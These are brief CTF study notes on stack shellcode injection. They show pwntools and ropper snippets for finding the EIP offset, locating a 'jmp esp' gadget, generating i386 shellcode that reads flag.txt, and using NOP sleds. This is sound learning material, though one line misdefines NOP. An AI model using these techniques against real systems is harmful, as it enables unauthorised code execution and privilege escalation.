### N o T e S

---

A shellcode is used when we don't have any interesting function to print the flag for us, so we inject our own code to trick the server to print the flag or escalate privilege. A shellcode in hacking is a small piece of code used as a payload in the exploitation of a vulnerability.
It is called a shell code as it typically starts a command shell from which the attacker can control the compromised machine.

![image](https://github.com/ckc9759/CTF_resources/assets/95117634/064ba5c1-48cf-430e-97e9-6bf21274537b)

```py
Finding the offset | cyclic 100
See the EIP register value
cyclic -l <value>
NX disabled,
jump to ESP and start executing the malicious code.
ropper --file <filename> --search "jmp esp"

Use shellcraft to construct the shell code
```

Python shell code example :

```py
import pwn
pwn.asm('push 0x08048540; ret')

Output --> b'h@\x85\x04\x08\xc3'
```

```py
import pwn
pwn.shellcraft.i386.linux.cat('flag.txt')
Use #Shell-storm on specified system arch, could be intel 386 (i386)
(python -c 'print ...'; cat) | ./program # To keep the shell active 
```

Now we can use this shellcode and supply it as input for the ELF file.

---

#### NOPs

No instruction pointer - helps marginally in shellcode injections.
`XCHG EAX, EAX`
`In intel x86 assembly, NOP instructions are \x90.`

```py
nop = asm(shellcraft.nop())
```


